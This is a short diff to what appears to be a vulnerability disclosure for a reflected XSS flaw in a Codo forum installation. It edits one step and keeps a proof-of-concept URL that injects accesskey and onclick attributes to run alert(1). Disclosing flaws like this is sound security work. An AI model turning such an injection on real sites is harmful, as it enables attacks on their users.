@@ -22,7 +22,7 @@
 # 02/24/2020: Discovered the vulnerability
 
 ## Reflected XSS
-### Create a post with Tags : http://URL/codo/index.php?u=user/profile/11110%22%20accesskey=%22X%22%20onclick=%22alert(1)
+### Go to : http://URL/codo/index.php?u=user/profile/11110%22%20accesskey=%22X%22%20onclick=%22alert(1)
 ### Use Alt+Shift+X , XSS will be fired
 
 # REPORT TIMELINE
